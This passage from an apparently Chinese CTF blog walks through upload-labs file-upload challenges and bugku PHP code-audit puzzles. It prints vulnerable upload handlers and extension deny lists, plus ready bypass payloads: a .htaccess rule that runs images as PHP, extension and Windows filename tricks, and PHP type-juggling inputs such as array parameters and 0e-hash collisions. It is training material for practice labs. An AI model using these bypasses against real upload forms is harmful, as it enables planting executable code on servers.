== &#x27;image/jpeg&#x27;) || ($_FILES[&#x27;upload_file&#x27;][&#x27;type&#x27;] == &#x27;image/png&#x27;) || ($_FILES[&#x27;upload_file&#x27;][&#x27;type&#x27;] == &#x27;image/gif&#x27;)) 这段代码说明是对文件的MIME类型进行了过滤，直接上传 1.php 抓包后修改文件类型为 &#39;image/jpeg&#39; ,&#39;image/png&#39;,&#39;image/gif&#39;,这三个类型都为图片 抓包修改MIME即可 知识点补充： MIME类型对大小写不敏感，但是传统写法都是小写。 12345678910111213text/plaintext/htmlimage/jpegimage/pngaudio/mpegaudio/oggaudio/*video/mp4application/*application/jsonapplication/javascriptapplication/ecmascriptapplication/octet-stream 更详细的解释， pass31$deny_ext = array(&#x27;.asp&#x27;,&#x27;.aspx&#x27;,&#x27;.php&#x27;,&#x27;.jsp&#x27;); 只禁止了.asp,.aspx,.php,.jsp后缀文件，可以使用php3,php5,php7,phtml等等后缀名绕过 pass4.htaccess文件的作用 URL重写、自定义错误页面 MIME类型配置 访问权限控制等 主要体现在伪静态的应用 图片防盗链 自定义404错误页面 阻止/允许特定IP/IP段 目录浏览与主页 禁止访问指定文件类型 文件密码保护 123&lt;FilesMatch &quot;1.jpg&quot;&gt;SetHandler application/x-httpd-php&lt;/FilesMatch&gt; 这几句代码的意思： 通过.htaccess文件调用php解析器去解析一个文件名中只要包含”1.jpg”这个字符串的任意文件， 无论扩展名是什么(没有也行)，都以php的方式来解析 上传完.htaccess文件后直接上传一个 1.jpg即可 pass5123456789101112131415161718192021222324252627$is_upload = false;$msg = null;if (isset($_POST[&#x27;submit&#x27;])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;); $file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, &#x27;.&#x27;); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //首尾去空 if (!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;]; $img_path = UPLOAD_PATH.&#x27;/&#x27;.$file_name; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = &#x27;上传出错！&#x27;; &#125; &#125; else &#123; $msg = &#x27;此文件类型不允许上传！&#x27;; &#125; &#125; else &#123; $msg = UPLOAD_PATH . &#x27;文件夹不存在,请手工创建！&#x27;; &#125;&#125; 本题与第十题完全一样，详细解答见第十题 pass61234567891011121314151617181920212223242526$is_upload = false;$msg = null;if (isset($_POST[&#x27;submit&#x27;])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;,&quot;.ini&quot;); $file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, &#x27;.&#x27;); $file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //首尾去空 if (!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;]; $img_path = UPLOAD_PATH.&#x27;/&#x27;.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = &#x27;上传出错！&#x27;; &#125; &#125; else &#123; $msg = &#x27;此文件类型不允许上传！&#x27;; &#125; &#125; else &#123; $msg = UPLOAD_PATH . &#x27;文件夹不存在,请手工创建！&#x27;; &#125;&#125; 仔细查看源码会发现少了下面的这段代码 1$file_ext = strtolower($file_ext); //转换为小写 这里就可以大小写绕过。将文件后缀名改为.pHp , .PHP等 pass71234567891011121314151617181920212223242526$is_upload = false;$msg = null;if (isset($_POST[&#x27;submit&#x27;])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;,&quot;.ini&quot;); $file_name = $_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]; $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, &#x27;.&#x27;); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//去除字符串::$DATA if (!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;]; $img_path = UPLOAD_PATH.&#x27;/&#x27;.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext; if (move_uploaded_file($temp_file,$img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = &#x27;上传出错！&#x27;; &#125; &#125; else &#123; $msg = &#x27;此文件不允许上传&#x27;; &#125; &#125; else &#123; $msg = UPLOAD_PATH . &#x27;文件夹不存在,请手工创建！&#x27;; &#125;&#125; 跟第六关对比发现少了这句话 $file_ext = trim($file_ext); //首尾去空 利用Windows系统的文件名特性。文件名最后增加空格和点，写成1.php .，这个需要用burpsuite抓包修改，上传后保存在Windows系统上的文件名最后的一个.会被去掉，实际上保存的文件名就是1.php pass81234567891011121314151617181920212223242526$is_upload = false;$msg = null;if (isset($_POST[&#x27;submit&#x27;])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;,&quot;.ini&quot;); $file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]); $file_ext = strrchr($file_name, &#x27;.&#x27;); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //首尾去空 if (!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;]; $img_path = UPLOAD_PATH.&#x27;/&#x27;.$file_name; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = &#x27;上传出错！&#x27;; &#125; &#125; else &#123; $msg = &#x27;此文件类型不允许上传！&#x27;; &#125; &#125; else &#123; $msg = UPLOAD_PATH . &#x27;文件夹不存在,请手工创建！&#x27;; &#125;&#125; 这段代码少了这句话，可以与第六关相同的做法 $file_name = deldot($file_name);//删除文件名末尾的点 pass91234567891011121314151617181920212223242526$is_upload = false;$msg = null;if (isset($_POST[&#x27;submit&#x27;])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;,&quot;.ini&quot;); $file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, &#x27;.&#x27;); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = trim($file_ext); //首尾去空 if (!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;]; $img_path = UPLOAD_PATH.&#x27;/&#x27;.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = &#x27;上传出错！&#x27;; &#125; &#125; else &#123; $msg = &#x27;此文件类型不允许上传！&#x27;; &#125; &#125; else &#123; $msg = UPLOAD_PATH . &#x27;文件夹不存在,请手工创建！&#x27;; &#125;&#125; 仔细观察发现少了这段代码 1$file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//去除字符串::$DATA 采用Windows文件流特性绕过 将文件名改为 1.php::$DATA,但是实质上保存的文件还是1.php pass10123456789101112131415161718192021222324252627$is_upload = false;$msg = null;if (isset($_POST[&#x27;submit&#x27;])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;,&quot;.ini&quot;); $file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, &#x27;.&#x27;); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //首尾去空 if (!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;]; $img_path = UPLOAD_PATH.&#x27;/&#x27;.$file_name; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = &#x27;上传出错！&#x27;; &#125; &#125; else &#123; $msg = &#x27;此文件类型不允许上传！&#x27;; &#125; &#125; else &#123; $msg = UPLOAD_PATH . &#x27;文件夹不存在,请手工创建！&#x27;; &#125;&#125; 这一句代码是用来检测末尾是否是.，可以双写绕过。抓包将文件名改为1.php. . （注意两点之间有空格） 前面去掉.然后检验.不存在，再去空格，留下php.，然后php.不属于$deny_ext数组中存在的，当然就直接提交了。因为windows自动去点，于是php后缀就出来了","tags":[{"name":"MIME","slug":"MIME","permalink":"https://sunzhengyu99.github.io/tags/MIME/"},{"name":"大小写绕过","slug":"大小写绕过","permalink":"https://sunzhengyu99.github.io/tags/%E5%A4%A7%E5%B0%8F%E5%86%99%E7%BB%95%E8%BF%87/"},{"name":".htaccess","slug":"htaccess","permalink":"https://sunzhengyu99.github.io/tags/htaccess/"},{"name":"windows文件特性","slug":"windows文件特性","permalink":"https://sunzhengyu99.github.io/tags/windows%E6%96%87%E4%BB%B6%E7%89%B9%E6%80%A7/"}]},{"title":"bugku代码审计","date":"2020-09-14T13:01:01.000Z","path":"2020/09/14/decode/","text":"简单的代码审计 extract变量覆盖12345678910111213141516&lt;?php$flag=&#x27;xxx&#x27;; //新建变量extract($_GET); // 变量覆盖if(isset($shiyan)) //判断是否存在&#123;$content=trim(file_get_contents($flag));//把文件读入字符串if($shiyan==$content) //判断两变量是否相等&#123;echo&#x27;flag&#123;xxx&#125;&#x27;;&#125;else&#123;echo&#x27;Oh.no&#x27;;&#125;&#125;?&gt; extract()函数 isset()函数isset() 函数用于检测变量是否已设置并且非 NULL。 如果已经使用 unset() 释放了一个变量之后，再通过 isset() 判断将返回 FALSE。 若使用 isset() 测试一个被设置成 NULL 的变量，将返回 FALSE。 同时要注意的是 null 字符（”\\0”）并不等同于 PHP 的 NULL 常量。 Tips:isset()函数如果一次传入多个参数，只有参数全被设置且非空的情况下才返回TRUE，isset()函数对数组中的元素同样适用。 file_get_contents() 变量覆盖的意思就是让自己上传的变量值覆盖原有的变量值 这里值得注意的是 $shiyan==$content,而content的值来自于函数自己建的$flag变量，所以这题目的变量覆盖实际是覆盖$flag的值，让flag的值和shiyan的值相同 可以用空值的方法使二者想等即 ?shiyan=&amp;flag= strcmp比较字符串http://123.206.87.240:9009/6.php 12345678910&lt;?php$flag = &quot;flag&#123;xxxxx&#125;&quot;;if (isset($_GET[&#x27;a&#x27;])) &#123;if (strcmp($_GET[&#x27;a&#x27;], $flag) == 0) //如果 str1 小于 str2 返回 &lt; 0； 如果 str1大于 str2返回 &gt; 0；如果两者相等，返回 0。//比较两个字符串（区分大小写）die(&#x27;Flag: &#x27;.$flag);elseprint &#x27;No&#x27;;&#125;?&gt; 题目给的注释很清楚的给出了获得flag的条件。。。 先了解一下 strcmp()的两个参数都必须是字符串类型的，但是如果传递一个非字符穿类型的参数进去，例如数组，则函数就会报错，其返回值就为0。满足 if (strcmp($_GET[&#39;a&#39;], $flag) == 0) 即可获得flag url:http://123.206.87.240:9009/6.php?a[]= urldecode二次编码绕过题目说的很清楚了，二次编码绕过 123456if(eregi(&quot;hackerDJ&quot;,$_GET[id])) &#123;echo(&quot;not allowed!&quot;); PHP 函数 eregi() 语法 int eregi(string pattern, string string, [array regs]); 定义和用法 eregi()函数在一个字符串搜索指定的模式的字符串。搜索不区分大小写。Eregi()可以特别有用的检查有效性字符串,如密码。 可选的输入参数规则包含一个数组的所有匹配表达式,他们被正则表达式的括号分组。 返回值 如果匹配成功返回true,否则,则返回false 这里进行了过滤，传的值不能为hackerDJ 123$_GET[id] = urldecode($_GET[id]);if($_GET[id] == &quot;hackerDJ&quot;) //要编码的字符串hackerDJ GET会提交时进行一次urlencode urldecode()于urlencode()是一对想反作用的函数，一个解码一个编码。 $_GET[id] = urldecode($_GET[id]) urldecode后的$_GET[id] 复制给自己等于hackerDJ 所以对hackerDJ 进行两次urlencode, 为了绕过过滤；进行一次urldecode后其值和hackerDJ相等，得到flag ?id=%25%36%38%25%36%31%25%36%33%25%36%42%25%36%35%25%37%32%25%34%34%25%34%41 md5()函数123456789101112&lt;?phperror_reporting(0);$flag = &#x27;flag&#123;test&#125;&#x27;;if (isset($_GET[&#x27;username&#x27;]) and isset($_GET[&#x27;password&#x27;])) &#123;if ($_GET[&#x27;username&#x27;] == $_GET[&#x27;password&#x27;])print &#x27;Your password can not be your username.&#x27;;else if (md5($_GET[&#x27;username&#x27;]) === md5($_GET[&#x27;password&#x27;]))die(&#x27;Flag: &#x27;.$flag);elseprint &#x27;Invalid password&#x27;;&#125;?&gt; 利用md5不能处理数组的特性绕过 md5() md5函数遇到数组类型的参数时，返回值为null，null===null,所以满足md5($_GET[&#39;username&#39;]) === md5($_GET[&#39;password&#39;] 12GET:/?username[]=1&amp;password[]=2 数组返回NULL绕过123456789101112&lt;?php$flag = &quot;flag&quot;;if (isset ($_GET[&#x27;password&#x27;])) &#123;if (ereg (&quot;^[a-zA-Z0-9]+$&quot;, $_GET[&#x27;password&#x27;]) === FALSE) //进行过滤，password必须包含字母和数字echo &#x27;You password must be alphanumeric&#x27;;else if (strpos ($_GET[&#x27;password&#x27;], &#x27;--&#x27;) !== FALSE)die(&#x27;Flag: &#x27; . $flag);elseecho &#x27;Invalid password&#x27;;&#125;?&gt; 提示是数组返回NULL 直接尝试提交?password[]=，flag就出来了 了解一下原理， 代码相关知识点链接如下： isset函数：http://php.net/manual/zh/function.isset.php ereg函数：http://www.php.net/manual/zh/function.ereg.php strpos函数：http://www.w3school.com.cn/php/func_string_strpos.asp “[A-Za-z0-9]”方括号表示字符集，[A-Za-z0-9]匹配大小写字母和数字其中一个字符 “^[A-Za-z0-9]$”^表示字符串开始，$表示字符串结束 ，这个匹配只有一个大小写字母和数字字符的字符串 “^[A-Za-z0-9]+$”+号表示重复1到多次，匹配由多个数字大小字母组成的字符串 值得注意的是这两个函数能处理的参数都是string类型 123ereg只能处理字符，r如果数组，则返回的是null，三个等号的时候不会进行类型转换。所以null不等于false。strpos的参数同样不能够是数组，所以返回的依旧是null，null不等于false也是正确。 故?password[]=可以绕过。 但是还有一种为%00截断 ?password=d%00-- 弱类型整数大小比较绕过1234$temp = $_GET[&#x27;password&#x27;];is_numeric($temp)?die(&quot;no numeric&quot;):NULL;if($temp&gt;1336)&#123;echo $flag; 题目说了弱类型比较绕过 payload： 1password=1444b 首先在is_numeric()检查时，因为1444b中包含了字母b所以不会认为是数字类型 在判断是否大于1336时，php默认1444b是数字类型，所以大于1336 sha()函数比较绕过123456789101112131415161718192021&lt;?php$flag = &quot;flag&quot;;if (isset($_GET[&#x27;name&#x27;]) and isset($_GET[&#x27;password&#x27;]))&#123; var_dump($_GET[&#x27;name&#x27;]); echo &quot;&quot;; var_dump($_GET[&#x27;password&#x27;]); var_dump(sha1($_GET[&#x27;name&#x27;])); var_dump(sha1($_GET[&#x27;password&#x27;])); if ($_GET[&#x27;name&#x27;] == $_GET[&#x27;password&#x27;]) echo &#x27;Your password can not be your name!&#x27;; else if (sha1($_GET[&#x27;name&#x27;]) === sha1($_GET[&#x27;password&#x27;])) die(&#x27;Flag: &#x27;.$flag); else echo &#x27;Invalid password.&#x27;;&#125;elseecho &#x27;Login first!&#x27;;?&gt; 代码逻辑很简单，首先判断是否get方式传递name和password参数 var_dump，输出参数类型和值 之后如果通过if判断则可以拿到flag if判断的条件 name和password不能相同 但是sha1(name)===sha1(password) 这里可以使用sha1函数无法处理数组的漏洞绕过，sha1遇到参数为数组类型时返回值为0 payload： 12GET:?name[]=1&amp;password[]=2 md5加密相等绕过1234567891011121314151617&lt;?php$md51 = md5(&#x27;QNKCDZO&#x27;);$a = @$_GET[&#x27;a&#x27;];$md52 = @md5($a);if(isset($a))&#123;if ($a != &#x27;QNKCDZO&#x27; &amp;&amp; $md51 == $md52) &#123; echo &quot;flag&#123;*&#125;&quot;;&#125; else &#123; echo &quot;false!!!&quot;;&#125;&#125;else&#123; echo &quot;please input a&quot;;&#125;?&gt; 即使用get方式传递一个参数a,使得a的值不等于QNKCDZO但是二者的md5值相同 PHP在处理哈希字符串时，会利用”!=”或”==”来对哈希值进行比较，它把每一个以”0E”开头的哈希值都解释为0，所以如果两个不同的密码经过哈希以后，其哈希值都是以”0E”开头的，那么PHP将会认为他们相同，都是0。 常见的payload有 1234567891011121314QNKCDZO240610708s878926199as155964671as214587387as214587387a//下面是sha1()加密后 ==相等的字符串 sha1(str)sha1(&#x27;aaroZmOk&#x27;) sha1(&#x27;aaK1STfY&#x27;)sha1(&#x27;aaO8zKZF&#x27;)sha1(&#x27;aa3OFF9m&#x27;) payload: 12GET:?a=240610708 十六进制与数字比较12345678910111213141516171819202122232425&lt;?phperror_reporting(0);function noother_says_correct($temp)&#123;$flag = &#x27;flag&#123;test&#125;&#x27;;$one = ord(&#x27;1&#x27;); //ord — 返回字符的 ASCII 码值$nine = ord(&#x27;9&#x27;); //ord — 返回字符的 ASCII 码值$number = &#x27;3735929054&#x27;;// Check all the input characters!for ($i = 0; $i &lt; strlen($number); $i++)&#123;// Disallow all the digits!$digit = ord($temp&#123;$i&#125;);if ( ($digit &gt;= $one) &amp;&amp; ($digit &lt;= $nine) )&#123;// Aha, digit not allowed!return &quot;flase&quot;;&#125;&#125;if($number == $temp)return $flag;&#125;$temp = $_GET[&#x27;password&#x27;];echo noother_says_correct($temp);?&gt; 重点在这段代码 123456789if ( ($digit &gt;= $one) &amp;&amp; ($digit &lt;= $nine) )&#123;// Aha, digit not allowed!return &quot;flase&quot;;&#125;&#125;if($number == $temp)return $flag;&#125; 输入的数字中不能包含1-9的数字 如果输入的数字和相等则拿到flag 可以想到的是将这段数字转换为十六进制 1234hex(3735929054)=0xdeadc0deGET:password=0xdeadc0de 变量覆盖网址打不开 ereg正则%00截断12345678910111213141516171819202122232425&lt;?php$flag = &quot;xxx&quot;;if (isset ($_GET[&#x27;password&#x27;]))&#123; if (ereg (&quot;^[a-zA-Z0-9]+$&quot;, $_GET[&#x27;password&#x27;]) === FALSE) &#123; echo &#x27;You password must be alphanumeric&#x27;; &#125; else if (strlen($_GET[&#x27;password&#x27;]) &lt; 8 &amp;&amp; $_GET[&#x27;password&#x27;] &gt; 9999999) &#123; if (strpos ($_GET[&#x27;password&#x27;], &#x27;-&#x27;) !== FALSE) //strpos — 查找字符串首次出现的位置 &#123; die(&#x27;Flag: &#x27; . $flag); &#125; else &#123; echo(&#x27;- have not been found&#x27;); &#125;&#125;else&#123; echo &#x27;Invalid password&#x27;;&#125;&#125;?&gt; 绕过三个if语句即可拿到flag 第一个 1if (ereg (&quot;^[a-zA-Z0-9]+$&quot;, $_GET[&#x27;password&#x27;]) === FALSE) 这个比较常见的正则表达式，也很容易理解 [a-zA-Z0-9]+包含大小写字符和数字，^是匹配开始标志，$是匹配结束标志 第二个 1if (strlen($_GET[&#x27;password&#x27;]) &lt; 8 &amp;&amp; $_GET[&#x27;password&#x27;] &gt; 9999999) password字段长度小于8，但是大于9999999，可以使用科学计数法 第三个 1if (strpos ($_GET[&#x27;password&#x27;], &#x27;-&#x27;) !== FALSE) password要包含 -（做题的时候会发现应该是*-*） payload 12GET:password=1e9%00*-* strpos数组绕过1234567891011&lt;?php$flag = &quot;flag&quot;;if (isset ($_GET[&#x27;ctf&#x27;])) &#123;if (@ereg (&quot;^[1-9]+$&quot;, $_GET[&#x27;ctf&#x27;]) === FALSE)echo &#x27;必须输入数字才行&#x27;;else if (strpos ($_GET[&#x27;ctf&#x27;], &#x27;#biubiubiu&#x27;) !== FALSE)die(&#x27;Flag: &#x27;.$flag);elseecho &#x27;骚年，继续努力吧啊~&#x27;;&#125;?&gt; 直接利用ereg和strpos函数不能处理数组的特性绕过 当输入ctf[]=11时，ereg返回值null!==FALSE strpos返回值也为null!=FALSE 拿到flag payload： 1234GET:?ctf[]=111//正常做法?nctf=1%00%23biubiubiu 数字验证正则绕过1234567891011121314151617181920212223242526272829303132&lt;?phperror_reporting(0);$flag = &#x27;flag&#123;test&#125;&#x27;;if (&quot;POST&quot; == $_SERVER[&#x27;REQUEST_METHOD&#x27;])&#123;$password = $_POST[&#x27;password&#x27;];if (0 &gt;= preg_match(&#x27;/^[[:graph:]]&#123;12,&#125;$/&#x27;, $password)) //preg_match — 执行一个正则表达式匹配 长度大于12&#123;echo &#x27;flag&#x27;;//这里输出的是假flag 真的在下面exit;&#125;while (TRUE)&#123;$reg = &#x27;/([[:punct:]]+|[[:digit:]]+|[[:upper:]]+|[[:lower:]]+)/&#x27;;if (6 &gt; preg_match_all($reg, $password, $arr))break;$c = 0;$ps = array(&#x27;punct&#x27;, &#x27;digit&#x27;, &#x27;upper&#x27;, &#x27;lower&#x27;); //[[:punct:]] 任何标点符号 [[:digit:]] 任何数字 [[:upper:]] 任何大写字母 [[:lower:]] 任何小写字母foreach ($ps as $pt)&#123;if (preg_match(&quot;/[[:$pt:]]+/&quot;, $password))$c += 1;&#125;if ($c &lt; 3) break;//&gt;=3，必须包含四种类型三种与三种以上if (&quot;42&quot; == $password) echo $flag;else echo &#x27;Wrong password&#x27;;exit;&#125;&#125;?&gt; 代码还挺长，但是直接抓住重点 1if (0 &gt;= preg_match(&#x27;/^[[:graph:]]&#123;12,&#125;$/&#x27;, $password)) [:graph]是所有可打印的字符,{12,},是在password中匹配12次以上，即password的长度大于12 下面的正则 1234567$ps = array(&#x27;punct&#x27;, &#x27;digit&#x27;, &#x27;upper&#x27;, &#x27;lower&#x27;); //[[:punct:]] 